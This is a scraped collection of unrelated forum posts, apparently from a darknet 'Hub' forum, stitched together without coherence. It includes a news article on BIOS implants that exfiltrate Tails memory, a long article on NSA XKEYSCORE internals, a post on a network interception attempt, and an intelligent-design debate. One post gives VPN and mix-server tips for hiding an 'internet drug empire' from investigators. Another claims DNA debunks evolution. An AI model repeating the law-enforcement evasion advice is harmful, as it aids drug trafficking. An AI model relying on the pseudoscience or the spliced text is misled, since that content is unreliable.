"The Hub Forums","flashy","7245.0","2015-03-21T00:16:48","OS analysis","General Discussion/Security","I have to agree that Qubes often looks like work in progress maybe something like some intellectual experiment still interesting though now concerning tails and firmware attacks and the like here is some fresh news very disturbing I almost cried and I always suspected EFI is evil:  While thereâs little evidence of BIOS bootkits in the wild, the ANT catalog and the recent disclosure of the Equation Groupâs cyberespionage platform, in particular module NLS_933W.DLL that reprograms firmware from most major vendors, leave little doubt that attacks against hardware are leaving the realm of academics and white hats.  Tomorrow at the CanSecWest conference in Vancouver, researchers Corey Kallenberg and Xeno Kovah, formerly of MITRE and founders of startup LegbaCore, will deliver research on new BIOS vulnerabilities and present a working rootkit implant into BIOS.  âMost BIOS have protections from modifications,â Kallenberg told Threatpost. âWe found a way to automate the discovery of vulnerabilities this space and break past those protections.â  Kallenberg said an attacker would need to already have remote access to a compromised computer in order to execute the implant and elevate privileges on the machine through the hardware. Their exploit turns down existing protections in place to prevent re-flashing of the firmware, enabling the implant to be inserted and executed.  The devious part of their exploit is that theyâve found a way to insert their agent into System Management Mode, which is used by firmware and runs separately from the operating system, managing various hardware controls. System Management Mode also has access to memory, which puts supposedly secure operating systems such as Tails in the line of fire of the implant.  Tails is a privacy-focused operating system that runs off removable media, such as USB stick, and whose aim is privacy and anonymity.  âThe idea is that if the OS is compromised by an implant, itâs OK to use Tails for communication (all Internet connections are made through the Tor browser) because itâs shielded from the malware that hit the main operating system,â Kallenberg said. âWhat the implant does is it waits for Tails to boot and scrapes sensitive data out of memory and exfiltrates it out. Our agent listens in the background, Tails doesnât see it.â  Their implant, the researchers said, is able to scrape the secret PGP key Tails uses for encrypted communication, for example. It can also steal passwords and encrypted communication. The implant survives OS re-installation and even Tailsâ built-in protections, including its capability of wiping RAM.  âWe store data in a non-volatile area and itâs not erased,â Kallenberg said. âThe idea is to make it obvious that these secure boot disk style things are architecturally vulnerable to attackers who come at you from the BIOS level space.â  Kovah said that architectural changes to the BIOS successor UEFI introduced modularity in order to simplify development. But that modularity, which is spelled out in the open source reference implementation of UEFI, is what can be abused. Itâs also what many vendors have based their code on.  Kovah explained that common code exists in the BIOS variants from different vendors, and that code makes it possible to reliably install implants across the different makes and models.  âThe open source reference implementation explains how data is passed and there are well-defined locations where to transfer internally to the BIOS,â Kovah said. âYou can look at the open source reference to look for patterns and see where the same data exists in closed source versions. Those common reference points define hook locations.â  An attacker may place code at those locations, Kovah said, and that up to 100 models from five vendors all share the same code or variants of the same code.  âBecause of that, you can reliably automate the search of strings for hooking, place hooks, and insert code,â Kovah said.  Kovah said an attacker, criminal or nation-state, can also infect the BIOS with physical access to a computer, such as at a border crossing. In a demo shared with Threatpost, using a DediProg flash programmer, Kovah was able to physically clip a connector cable onto the BIOS and download an implant that way.  âThis can be used at a border crossing, in an Evil Maid attack, or other physical interdiction attacks,â he said. âIf you have access, it takes about two minutes once you find the BIOS. The idea is to give this to the unskilled, give them a target, open the computer, connect and press start. It takes about 50 seconds to re-flash the chip.  âThe point here is that even if you think youâre doing strong op-sec by using Tails or not carrying a hard drive, it doesnât matter,â Kovah said. âTwo minutes of physical access and you can own any OS.â  The situation isnât entirely bleak. The researchers said that vendors do a solid job of patching vulnerabilities that are reported to them, but need to improve secure coding practices and put more effort into vulnerability mitigations.  âAs time goes on and the cost of exploitation gets higher because more bugs get killed off and new techniques make it harder to exploit, I think that attacking BIOS will be more appealing because of the persistence on that system,â Kallenberg said.

This is called âIntel Active Management Technologyâ, and means that an IT technician in a large office/university IT suite can update software, or do other things to machines, without having to be physically near them. The problem, of course, is that the same functionality can be abused to install spyware or manipulate the systems in other ways. All laptops made after 2008 contain these chipsets, and are therefore vulnerable to these types of attacks when they are on a network.  The âIntel 945â chipset is the most recently made chipset without this automatable feature, and hence lends itself to a securable motherboard/computer. When choosing a laptop, you can see what its chipset is on the specification.   There are only a handful of machines that can be confidently secured against remote hardware, firmware and chipset accessibility. Currently, the model that is being most frequently secured in this way is the IBM ThinkPad X60 (and X60s). It has an Intel 945 chipset (ie pre-AMT), and specialist work can be done to secure the hardware and firmware (the proprietary firmware can be replaced by open source firmware, âcorebootâ).'''  Also this clearnet link  https://forums.lenovo.com/t5/Security-Malware/Intel-AMT-backdoor-enabled-by-default/td-p/824749   Keep in mind that installing coreboot on those old Lenovo is definitely not for the fainthearted there is some online site selling patched laptops for a price and also keep in mind those older laptops may not be that powerful for your needs  AMD look like a safer bet but who knows but still better than nothing as for Intel centrino technology was made in Israel so chances are centrino laptops already took off with the best in spy tech now concerning ARM and the like of banana pi it doesn't look bad so far but usability is not very good for the moment I mean you cant just fire up a pi with tails and do your thing hopefully this will change in the future though my bet is on Baikal imagine using russian technology and drinking vodka while on the job how cool is that  We need more people on the lookout for good hardware and keep pressuring for better cpus and no locked firmware ",""

The NSAâs XKEYSCORE program, first revealed by The Guardian, sweeps up countless peopleâs Internet searches, emails, documents, usernames and passwords, and other private communications.

As of 2008, the surveillance system boasted approximately 150 field sites in the United States, Mexico, Brazil, United Kingdom, Spain, Russia, Nigeria, Somalia, Pakistan, Japan, Australia, as well as many other countries, consisting of over 700 servers.  These servers store âfull-take dataâ at the collection sites â meaning that they captured all of the traffic collected â and, as of 2009, stored content for 3 to 5 days and metadata for 30 to 45 days. NSA documents indicate that tens of billions of records are stored in its database. âIt is a fully distributed processing and query system that runs on machines around the world,â an NSA briefing on XKEYSCORE says. âAt field sites, XKEYSCORE can run on multiple computers that gives it the ability to scale in both processing power and storage.â  XKEYSCORE also collects and processes Internet traffic from Americans, though NSA analysts are taught to avoid querying the system in ways that might result in spying on U.S. data. Experts and privacy activists, however, have long doubted that such exclusions are effective in preventing large amounts of American data from being swept up. One document The Intercept is publishing today suggests that FISA warrants have authorized âfull-takeâ collection of traffic from at least some U.S. web forums.  The system is not limited to collecting web traffic. The 2013 document, âVoIP Configuration and Forwarding Read Me,â details how to forward VoIP data from XKEYSCORE into NUCLEON, NSAâs repository for voice intercepts, facsimile, video and âpre-released transcription.â At the time, it supported more than 8,000 users globally and was made up of 75 servers absorbing 700,000 voice, fax, video and tag files per day.  The reach and potency of XKEYSCORE as a surveillance instrument is astonishing. The Guardian report noted that NSA itself refers to the program as its âwidest reachingâ system. In February of this year, The Intercept reported that NSA and GCHQ hacked into the internal network of Gemalto, the worldâs largest provider of cell phone SIM cards, in order to steal millions of encryption keys used to protect the privacy of cell phone communication. XKEYSCORE played a vital role in the spiesâ hacking by providing government hackers access to the email accounts of Gemalto employees.  Numerous key NSA partners, including Canada, New Zealand and the U.K., have access to the mass surveillance databases of XKEYSCORE. In March, the New Zealand Herald, in partnership with The Intercept, revealed that the New Zealand government used XKEYSCORE to spy on candidates for the position of World Trade Organization director general and also members of the Solomon Islands government.  These newly published documents demonstrate that collected communications not only include emails, chats and web-browsing traffic, but also pictures, documents, voice calls, webcam photos, web searches, advertising analytics traffic, social media traffic, botnet traffic, logged keystrokes, computer network exploitation (CNE) targeting, intercepted username and password pairs, file uploads to online services, Skype sessions and more. Bulk collection and population surveillance  XKEYSCORE allows for incredibly broad surveillance of people based on perceived patterns of suspicious behavior. It is possible, for instance, to query the system to show the activities of people based on their location, nationality and websites visited. For instance, one slide displays the search âgermansinpakistn,â showing an analyst querying XKEYSCORE for all individuals in Pakistan visiting specific German language message boards.  As sites like Twitter and Facebook become increasingly significant in the worldâs day-to-day communications (a Pew study shows that 71 percent of online adults in the U.S. use Facebook), they become a critical source of surveillance data. Traffic from popular social media sites is described as âa great starting pointâ for tracking individuals, according to an XKEYSCORE presentation titled âTracking Targets on Online Social Networks.â  When intelligence agencies collect massive amounts of Internet traffic all over the world, they face the challenge of making sense of that data. The vast quantities collected make it difficult to connect the stored traffic to specific individuals.  Internet companies have also encountered this problem and have solved it by tracking their users with identifiers that are unique to each individual, often in the form of browser cookies. Cookies are small pieces of data that websites store in visitorsâ browsers. They are used for a variety of purposes, including authenticating users (cookies make it possible to log in to websites), storing preferences, and uniquely tracking individuals even if theyâre using the same IP address as many other people. Websites also embed code used by third-party services to collect analytics or host ads, which also use cookies to track users. According to one slide, âAlmost all websites have cookies enabled.â  The NSAâs ability to piggyback off of private companiesâ tracking of their own users is a vital instrument that allows the agency to trace the data it collects to individual users. It makes no difference if visitors switch to public Wi-Fi networks or connect to VPNs to change their IP addresses: the tracking cookie will follow them around as long as they are using the same web browser and fail to clear their cookies.  Apps that run on tablets and smartphones also use analytics services that uniquely track users. Almost every time a user sees an advertisement (in an app or in a web browser), the ad network is tracking users in the same way. A secret GCHQ and CSE program called BADASS, which is similar to XKEYSCORE but with a much narrower scope, mines as much valuable information from leaky smartphone apps as possible, including unique tracking identifiers that app developers use to track their own users. In May of this year, CBC, in partnership with The Intercept, revealed that XKEYSCORE was used to track smartphone connections to the app marketplaces run by Samsung and Google. Surveillance agency analysts also use other types of traffic data that gets scooped into XKEYSCORE to track people, such as Windows crash reports.  In a statement to The Intercept, the NSA reiterated its position that such sweeping surveillance capabilities are needed to fight the War on Terror:  âThe U.S. Government calls on its intelligence agencies to protect the United States, its citizens, and its allies from a wide array of serious threats. These threats include terrorist plots from al-Qaeda, ISIL, and others; the proliferation of weapons of mass destruction; foreign aggression against the United States and our allies; and international criminal organizations.â  Indeed, one of the specific examples of XKEYSCORE applications given in the documents is spying on Shaykh Atiyatallah, an al Qaeda senior leader and Osama bin Laden confidant. A few years before his death, Atiyatallah did what many people have often done: He googled himself. He searched his various aliases, an associate and the name of his book. As he did so, all of that information was captured by XKEYSCORE.  XKEYSCORE has, however, also been used to spy on non-terrorist targets. The April 18, 2013 issue of the internal NSA publication Special Source Operations Weekly boasts that analysts were successful in using XKEYSCORE to obtain U.N. Secretary General Ban Ki-moonâs talking points prior to a meeting with President Obama. XKEYSCORE for hacking: easily collecting user names, passwords and much more  XKEYSCORE plays a central role in how the U.S. government and its surveillance allies hack computer networks around the world. One top-secret 2009 NSA document describes how the system is used by the NSA to gather information for the Office of Tailored Access Operations, an NSA division responsible for Computer Network Exploitation (CNE) â i.e., targeted hacking.  Particularly in 2009, the hacking tactics enabled by XKEYSCORE would have yielded significant returns as use of encryption was less widespread than today. Jonathan Brossard, a security researcher and the CEO of Toucan Systems, told The Intercept: âAnyone could be trained to do this in less than one day: they simply enter the name of the server they want to hack into XKEYSCORE, type enter, and are presented login and password pairs to connect to this machine. Done. Finito.â Previous reporting by The Intercept revealed that systems administrators are a popular target of the NSA. âWho better to target than the person that already has the âkeys to the kingdom?ââ read a 2012 post on an internal NSA discussion board.  This system enables analysts to access web mail servers with remarkable ease.  The same methods are used to steal the credentials â user names and passwords â of individual users of message boards.  Hacker forums are also monitored for people selling or using exploits and other hacking tools. While the NSA is clearly monitoring to understand the capabilities developed by its adversaries, it is also monitoring locations where such capabilities can be purchased.  Other information gained via XKEYSCORE facilitates the remote exploitation of target computers. By extracting browser fingerprint and operating system versions from Internet traffic, the system allows analysts to quickly assess the exploitability of a target. Brossard, the security researcher, said that âNSA has built an impressively complete set of automated hacking tools for their analysts to use.â  Given the breadth of information collected by XKEYSCORE, accessing and exploiting a targetâs online activity is a matter of a few mouse clicks. Brossard explains: âThe amount of work an analyst has to perform to actually break into remote computers over the Internet seems ridiculously reduced â we are talking minutes, if not seconds. Simple. As easy as typing a few words in Google.â  These facts bolster one of Snowdenâs most controversial statements, made in his first video interview published by The Guardian on June 9, 2013. âI, sitting at my desk,â said Snowden, could âwiretap anyone, from you or your accountant, to a federal judge to even the president, if I had a personal email.â  Indeed, training documents for XKEYSCORE repeatedly highlight how user-friendly the program is: with just a few clicks, any analyst with access to it can conduct sweeping searches simply by entering a personâs email address, telephone number, name or other identifying data. There is no indication in the documents reviewed that prior approval is needed for specific searches.  In addition to login credentials and other target intelligence, XKEYSCORE collects router configuration information, which it shares with Tailored Access Operations. The office is able to exploit routers and then feed the traffic traveling through those routers into their collection infrastructure. This allows the NSA to spy on traffic from otherwise out-of-reach networks. XKEYSCORE documents reference router configurations, and a document previously published by Der Spiegel shows that âactive implantsâ can be used to âcop[y] traffic and direc[t]â it past a passive collector. XKEYSCORE for counterintelligence  Beyond enabling the collection, categorization, and querying of metadata and content, XKEYSCORE has also been used to monitor the surveillance and hacking actions of foreign nation states and to gather the fruits of their hacking. The Intercept previously reported that NSA and its allies spy on hackers in order to collect what they collect.  Once the hacking tools and techniques of a foreign entity (for instance, South Korea) are identified, analysts can then extract the countryâs espionage targets from XKEYSCORE, and gather information that the foreign power has managed to steal.  Monitoring of foreign state hackers could allow the NSA to gather techniques and tools used by foreign actors, including knowledge of zero-day exploitsâsoftware bugs that allow attackers to hack into systems, and that not even the software vendor knows aboutâand implants. Additionally, by monitoring vulnerability reports sent to vendors such as Kaspersky, the agency could learn when exploits they were actively using need to be retired because theyâve been discovered by a third party. Seizure v. searching: oversight, audit trail and the Fourth Amendment  By the nature of how it sweeps up information, XKEYSCORE gathers communications of Americans, despite the Fourth Amendment protection against âunreasonable search and seizureâ â including searching data without a warrant. The NSA says it does not target U.S. citizensâ communications without a warrant, but acknowledges that it âincidentallyâ collects and reads some of it without one, minimizing the information that is retained or shared.  But that interpretation of the law is dubious at best.  XKEYSCORE training documents say that the âburden is on user/auditor to comply with USSID-18 or other rules,â apparently including the British Human Rights Act (HRA), which protects the rights of U.K. citizens. U.S. Signals Intelligence Directive 18 (USSID 18) is the American directive that governs âU.S. person minimization.â  Kurt Opsahl, the Electronic Frontier Foundationâs general counsel, describes USSID 18 as âan attempt by the intelligence community to comply with the Fourth Amendment. But it doesnât come from a court, it comes from the executive.â  If, for instance, an analyst searched XKEYSCORE for all iPhone users, this query would violate USSID 18 due to the inevitable American iPhone users that would be grabbed without a warrant, as the NSAâs own training materials make clear.  Opsahl believes that analysts are not prevented by technical means from making queries that violate USSID 18. âThe document discusses whether auditors will be happy or unhappy. This indicates that compliance will be achieved by after-the-fact auditing, not by preventing the search.â  Screenshots of the XKEYSCORE web-based user interface included in slides show that analysts see a prominent warning message: âThis system is audited for USSID 18 and Human Rights Act compliance.â When analysts log in to the system, they see a more detailed message warning that âan audit trail has been established and will be searchedâ in response to HRA complaints, and as part of the USSID 18 and USSID 9 audit process.  Because the XKEYSCORE system does not appear to prevent analysts from making queries that would be in violation of these rules, Opsahl concludes that âthereâs a tremendous amount of power being placed in the hands of analysts.â And while those analysts may be subject to audits, âat least in the short term they can still obtain information that they shouldnât have.â  During a symposium in January 2015 hosted at Harvard University, Edward Snowden, who spoke via video call, said that NSA analysts are âcompletely free from any meaningful oversight.â Speaking about the people who audit NSA systems like XKEYSCORE for USSID 18 compliance, he said, âThe majority of the people who are doing the auditing are the friends of the analysts. They work in the same office. Theyâre not full-time auditors, theyâre guys who have other duties assigned. There are a few traveling auditors who go around and look at the things that are out there, but really itâs not robust.â  In a statement to The Intercept, the NSA said:  âThe National Security Agencyâs foreign intelligence operations are 1) authorized by law; 2) subject to multiple layers of stringent internal and external oversight; and 3) conducted in a manner that is designed to protect privacy and civil liberties. As provided for by Presidential Policy Directive 28 (PPD-28), all persons, regardless of their nationality, have legitimate privacy interests in the handling of their personal information. NSA goes to great lengths to narrowly tailor and focus its signals intelligence operations on the collection of communications that are most likely to contain foreign intelligence or counterintelligence information.â    The sheer quantity of communications that XKEYSCORE processes, filters and queries is stunning. Around the world, when a person gets online to do anything â write an email, post to a social network, browse the web or play a video game â thereâs a decent chance that the Internet traffic her device sends and receives is getting collected and processed by one of XKEYSCOREâs hundreds of servers scattered across the globe.  In order to make sense of such a massive and steady flow of information, analysts working for the National Security Agency, as well as partner spy agencies, have written thousands of snippets of code to detect different types of traffic and extract useful information from each type, according to documents dating up to 2013. For example, the system automatically detects if a given piece of traffic is an email. If it is, the system tags if itâs from Yahoo or Gmail, if it contains an airline itinerary, if itâs encrypted with PGP, or if the senderâs language is set to Arabic, along with myriad other details.  This global Internet surveillance network is powered by a somewhat clunky piece of software running on clusters of Linux servers. Analysts access XKEYSCOREâs web interface to search its wealth of private information, similar to how ordinary people can search Google for public information.  Based on documents provided by NSA whistleblower Edward Snowden, The Intercept is shedding light on the inner workings of XKEYSCORE, one of the most extensive programs of mass surveillance in human history. How XKEYSCORE works under the hood  It is tempting to assume that expensive, proprietary operating systems and software must power XKEYSCORE, but it actually relies on an entirely open source stack. In fact, according to an analysis of an XKEYSCORE manual for new systems administrators from the end of 2012, the system may have design deficiencies that could leave it vulnerable to attack by an intelligence agency insider.  XKEYSCORE is a piece of Linux software that is typically deployed on Red Hat servers. It uses the Apache web server and stores collected data in MySQL databases. File systems in a cluster are handled by the NFS distributed file system and the autofs service, and scheduled tasks are handled by the cron scheduling service. Systems administrators who maintain XKEYSCORE servers use SSH to connect to them, and they use tools such as rsync and vim, as well as a comprehensive command-line tool, to manage the software.  John Adams, former security lead and senior operations engineer for Twitter, says that one of the most interesting things about XKEYSCOREâs architecture is âthat they were able to achieve so much success with such a poorly designed system. Data ingest, day-to-day operations, and searching is all poorly designed. There are many open source offerings that would function far better than this design with very little work. Their operations team must be extremely unhappy.â  Analysts connect to XKEYSCORE over HTTPS using standard web browsers such as Firefox. Internet Explorer is not supported. Analysts can log into the system with either a user ID and password or by using public key authentication.  As of 2009, XKEYSCORE servers were located at more than 100 field sites all over the world. Each field site consists of a cluster of servers; the exact number differs depending on how much information is being collected at that site. Sites with relatively low traffic can get by with fewer servers, but sites that spy on larger amounts of traffic require more servers to filter and parse it all. XKEYSCORE has been engineered to scale in both processing power and storage by adding more servers to a cluster. According to a 2009 document, some field sites receive over 20 terrabytes of data per day. This is the equivalent of 5.7 million songs, or over 13 thousand full-length films.  This map from a 2009 top-secret presentation does not show all of XKEYSCOREâs field sites.  When data is collected at an XKEYSCORE field site, it is processed locally and ultimately stored in MySQL databases at that site. XKEYSCORE supports a federated query system, which means that an analyst can conduct a single query from the central XKEYSCORE website, and it will communicate over the Internet to all of the field sites, running the query everywhere at once.  There might be security issues with the XKEYSCORE system itself as well. As hard as software developers may try, itâs nearly impossible to write bug-free source code. To compensate for this, developers often rely on multiple layers of security; if attackers can get through one layer, they may still be thwarted by other layers. XKEYSCORE appears to do a bad job of this.  When systems administrators log into XKEYSCORE servers to configure them, they appear to use a shared account, under the name âoper.â Adams notes, âThat means that changes made by an administrator cannot be logged.â If one administrator does something malicious on an XKEYSCORE server using the âoperâ user, itâs possible that the digital trail of what was done wouldnât lead back to the administrator, since multiple operators use the account.  There appears to be another way an ill-intentioned systems administrator may be able to cover their tracks. Analysts wishing to query XKEYSCORE sign in via a web browser, and their searches are logged. This creates an audit trail, on which the system relies to assure that users arenât doing overly broad searches that would pull up U.S. citizensâ web traffic. Systems administrators, however, are able to run MySQL queries. The documents indicate that administrators have the ability to directly query the MySQL databases, where the collected data is stored, apparently bypassing the audit trail. AppIDs, fingerprints and microplugins  Collecting massive amounts of raw data is not very useful unless it is collated and organized in a way that can be searched. To deal with this problem, XKEYSCORE extracts and tags metadata and content from the raw data so that analysts can easily search it.  This is done by using dictionaries of rules called appIDs, fingerprints and microplugins that are written in a custom programming language called GENESIS. Each of these can be identified by a unique name that resembles a directory tree, such as âmail/webmail/gmail,â âchat/yahoo,â or âbotnet/blackenergybot/command/flood.â  One document detailing XKEYSCORE appIDs and fingerprints lists several revealing examples. Windows Update requests appear to fall under the âupdate_service/windowsâ appID, and normal web requests fall under the âhttp/getâ appID. XKEYSCORE can automatically detect Airblue travel itineraries with the âtravel/airblueâ fingerprint, and iPhone web browser traffic with the âbrowser/cellphone/iphoneâ fingerprint.  PGP-encrypted messages are detected with the âencryption/pgp/messageâ fingerprint, and messages encrypted with Mojahedeen Secrets 2 (a type of encryption popular among supporters of al Qaeda) are detected with the âencryption/mojaheden2â fingerprint.  When new traffic flows into an XKEYSCORE cluster, the system tests the intercepted data against each of these rules and stores whether the traffic matches the pattern. A slideshow presentation from 2010 says that XKEYSCORE contains almost 10,000 appIDs and fingerprints.  AppIDs are used to identify the protocol of traffic being intercepted, while fingerprints detect a specific type of content. Each intercepted stream of traffic gets assigned up to one appID and any number of fingerprints. You can think of appIDs as categories and fingerprints as tags.  If multiple appIDs match a single stream of traffic, the appID with the lowest âlevelâ is selected (appIDs with lower levels are more specific than appIDs with higher levels). For example, when XKEYSCORE is assessing a file attachment from Yahoo mail, all of the appIDs in the following slide will apply, however only âmail/webmail/yahoo/attachmentâ will be associated with this stream of traffic.  To tie it all together, when an Arabic speaker logs into a Yahoo email address, XKEYSCORE will store âmail/yahoo/loginâ as the associated appID. This stream of traffic will match the âmail/arabicâ fingerprint (denoting language settings), as well as the âmail/yahoo/ymbmâ fingerprint (which detects Yahoo browser cookies).  Sometimes the GENESIS programming language, which largely relies on Boolean logic, regular expressions and a set of simple functions, isnât powerful enough to do the complex pattern-matching required to detect certain types of traffic. In these cases, as one slide puts it, âPower users can drop in to C++ to express themselves.â AppIDs or fingerprints that are written in C++ are called microplugins.  Hereâs an example of a microplugin fingerprint for âbotnet/conficker_p2p_udp_data,â which is tricky botnet traffic that canât be identified without complicated logic. A botnet is a collection of hacked computers, sometimes millions of them, that are controlled from a single point.  Hereâs another microplugin that uses C++ to inspect intercepted Facebook chat messages and pull out details like the associated email address and body of the chat message.  One document from 2009 describes in detail four generations of appIDs and fingerprints, which begin with only the ability to scan intercepted traffic for keywords, and end with the ability to write complex microplugins that can be deployed to field sites around the world in hours.  If XKEYSCORE development has continued at a similar pace over the last six years, itâs likely considerably more powerful today.  ",""

Maybe the work of some sexually frustrated soul trying to get some juicy facebook accounts. But later the attempts became more serious, covering larger areas and networks and even different networks at the same time, trying to get across some certificate valid in the 192.168 domain only and even trying to connect to ''google'' to download some obscure management console, supposedely using a false google certificate.    I wondered what temporarily accepting the exception would lead to, and it looked like nothing would get through to the greater internet. I could see the malicious man scanning the whole 192.168 domain through some 123.123.123.123 ip, while people in frustration wondered why the network is down.

A foreign VPN is no guarantee either, if they are subject to MLAT like how they got Ulbricht's Iceland servers plus they can go to Russian VPN upstream providers too and find metadata about your connections in some cases, like if they are using gigantic European backbones out of NL or UK.   A VPN is an encrypted tunnel so nobody local can spy on your traffic. This is good for defeating metadata about times you connected to Tor, so they can't match them up with logins to your internet drug empire or public chat logs with time stamps. Jondonym can help with this, you can tunnel Tor traffic through their Mix servers to further obscure your connection https://anonymous-proxy-servers.net/en/overview.html pick the Bulgarian VPN as one of the Mixes since the country is so corrupt no evidence from there can be trusted.

Rather, what I think is going on, is that you are  desperate to buy a gun, and do business with these people, yet at the same time, you are afraid of being ripped-off. What you're really looking for, is  reassurance that the course of action you've already decided upon is the right one. We can neither provide you with that reassurance, nor can anyone here provide you with the type of proof you're looking for.   I strongly suspect that one of two things will happen if you try to order a gun:   1) You'll be ripped-off -- if you're lucky, this will be the case.   2) You'll not only lose your money, but your freedom as well for attempting to purchase contraband.   So, go ahead and order from these guys -- if you get ripped-off,  you can be the first one to post about how you were ripped-off.

How are these calculations being made? Against what can one measure the spoken of probabilities? Such probabilities can only be measured if one assumes the presence of a creator, making it a circular argument. Then we would have to speak of the probability of the existence of a creator, which is nonsensical since this creator is assumed to have no cause of its own and therefore nothing which can be said to have a propensity to produce a creator","Quote from: Richard DawkinsYet the living results of natural selection overwhelmingly impress us with the appearance of design as if by a master watchmaker, impress us with the illusion of design and planning.Quote from: Richard DawkinsThe natural temptation is to attribute the appearance of design to actual design itself. In the case of a man-made artifact such as a watch, the designer really was an intelligent engineer.

The discussion might have started prior to an answer being found or there could be some serious doubts over the conclusion reached due to things like invalid / inaccurate data being used or an individuals qualifications not allowing them to make such conclusions. There are always going to be cynics and doubters out there who will question everything when something doesn't go their way and look for opportunities to challenge the validity of their answer and perhaps raise some questions to be answered.   Most of the time, a result or a conclusion can be reached when all things are taken into consideration and analyzed closely. Basically, it's evidence based reporting where data is used to support any claims made. If you can't back up what you claim has occurred with documented, factual proof then basically your theory will be dismissed, as it should be.  I'm the opposite to you Riposte.

In his autobiography, Crick says very candidly biologists must remind themselves daily that what they study was not created, it evolved; it was not designed, it evolved. Why do they have to remind themselves of that? Because otherwise, the facts which are staring them in the face and trying to get their attention might break through. What we discovered when I developed a working group of scientists, philosophers, et al., in the United States was that living organisms look as if they were designed and they look that way because that is exactly what they are.ÂUnquoteEvolutionistas claim ID is not a Science and it doesnât explain anything..Ok letâs give em that one..It does achieve one thing though (DNA under a microscope) and it does it in fatal fashion if nothing else it debunks the whole theory of evolution..there is no gradual slope a cow remains a cow a whale remains a whaleâ¦how you go about interpreting this information is purely up to you you can ignore it deny it but itâs still gonna be there.

If you can't provide any relevant information, documentation or data to support your claim or at the very least demonstrate a high probability it of actually occurring then to me it's pointless discussing it any further. I'm not really into the theoretical side of things unless the theory itself can be tested in a practical, real world scenario and proven itself to warrant further development and investment. I do know of some past and present university students who think like you though Riposte! Everything in life happens for a reason Riposte although the reasons why may be perceived or interpreted differently by certain individuals. That being said, the only reason A happened today was because of what happened to B earlier in the day.   After all that, this conundrum is still no closer to being solved than it was at any point in the entire history of Humanity. The same will be said at any point into the future as well because there is literally no answer to the question being asked and nor will there ever be. There will forever be an ongoing debate over what did happen all those years ago but all it will be based on is speculation, assumptions, projections, thought bubbles and theories, just to name a few, and nothing more than that. I don't understand why we just can't let this go and focus our attentions on more important things like the issues facing us in todays world and what the future holds for us all. I'm sure many people find this interesting and would dearly love to know the truth however it's something that I feel is lost forever and will never be revealed. Think of it as a mystery with few clues on offer. It's just not possible IMO. We can all say things which may sound legit to some and not so to others but if no one has the correct information to enable a reasonably intelligent individual to accurately answer a question being posed to them by another person then it's going to be an ongoing, seemingly monotonous debate that will forever drag on leaving us all ""none the wiser"".      ","@Jigsaw I am not describing god I do not know who god is I do not really care..

However, scientific discoveries within the last 30 years brought him to a conclusion he could not avoid. In a video interview in December 2004 he stated, ""Super-intelligence is the only good explanation for the origin of life and the complexity of nature.""1 Prominent in his conclusion were the discoveries of DNA. Here's why.computer programming:signs for Intelligent DesignDNA code:signs for Intelligent DesignDNA in our cells is very similar to an intricate computer program. In the photo on the left, you see that a computer program is made up of a series of ones and zeros (called binary code). The sequencing and ordering of these ones and zeros is what makes the computer program work properly.In the same way, DNA is made up of four chemicals, abbreviated as letters A, T, G, and C. Much like the ones and zeros, these letters are arranged in the human cell like this: CGTGTGACTCGCTCCTGAT and so on. The order in which they are arranged instructs the cell's actions.What is amazing is that within the tiny space in every cell in your body, this code is three billion letters long!!2To grasp the amount of DNA information in one cell, ""a live reading of that code at a rate of three letters per second would take thirty-one years, even if reading continued day and night.""3 Wait, there's more.It has been determined that 99.9% of your DNA is similar to everyone's genetic makeup.4 What is uniquely you comes in the fractional difference in how those three billion letters are sequenced in your cells.Dr. Francis Collins, director of the Human Genome Project (that mapped the human DNA structure) said that one can ""think of DNA as an instructional script, a software program, sitting in the nucleus of the cell.""5Perry Marshall, an information specialist, comments on the implications of this. ""There has never existed a computer program that wasn't designed...[whether it is] a code, or a program, or a message given through a language, there is always an intelligent mind behind it.""6Just as former atheist Dr. Antony Flew questioned, it is legitimate to ask oneself regarding this three billion letter code instructing the cell...who wrote this script? Who placed this working code, inside the cell? Earth to Emmet still with us?Quote from: Signature In The Cell Meyer shares with readers the excitement of the most recent discoveries, as the digital technology at work in the cell has been progressively revealed. The operating system embedded in the genome includes -Nested coding, -Digital processing, -Distributive retrieval and storage systems. It is very extraordinaryâthe terminology is all recognizable from computer science.Now we are onto AliensQuote If I was to ask you Do other intelligent life forms exist in the universe? What would you say? Quote from: The real Jigsaw Puzzle on July 01, 2015, 08:44:36 pmI know you weren't asking me Riposte but my answer would be I literally don't know. I would like to think that somewhere out there in the vast cosmos of outer space there are other intelligent civilizations who inhabit a planet similar to Earth who have the same thoughts as we do regarding meeting alien life forms and will we ever find them. Really, who knows what the future holds but considering it would take a human over 300+ years of continuous (24/7 - 365 days a year) space travel to reach the former last planet in our solar system, Pluto, I think the aliens would need to be the ones who make contact with us. There is no possibility of life on the other planets (Mars is still up for debate but nothing concrete) in our solar system however ours is but one of BILLIONS of other solar systems and galaxies out there which may contain alien life forms so I would never say never on that subject. The problem is that space is infinite meaning it's just so big that it's beyond the comprehension of most people.

Quote from: The real Jigsaw Puzzle on July 02, 2015, 12:54:17 amWhile I do believe there is some form of life after death (whether it's God or some other spiritual being), the fact is none of us will know until we die ourselves. God may be someone that people worship and dedicate a large portion of their life to by attending Church, Mass, gatherings, etc each week however having a belief in something certainly doesn't make it reality. There's a lot of people who believe in a variety of different things and that's their personal choice to make however why is it that you cannot explain to me who is above God? I you don't know anything about who may be above God then surely you couldn't describe him/her/them to anyone? That's just ridiculous to suggest you could describe an unknown entity. Discussing a theory about what happened is one thing however when you start to actually believe them, especially when we're talking millions of years ago, you're drawing a long bow IMO.Anyway Riposte, we're getting in way too deep here for my liking because I'm getting a headache!You believe in some form of after life. I am pleasantly surprised to hear that.. I believe that when I die my memory will be erased and put back into the collective field.So it would be like you were never born in the first place...Kinda sad of God to whore your conscience like that... ; There is no need to jump to conclusions if there is a lack of evidence just leave it blank.

How are these calculations being made? Against what can one measure the spoken of probabilities? Such probabilities can only be measured if one assumes the presence of a creator, making it a circular argument. Then we would have to speak of the probability of the existence of a creator, which is nonsensical since this creator is assumed to have no cause of its own and therefore nothing which can be said to have a propensity to produce a creator"

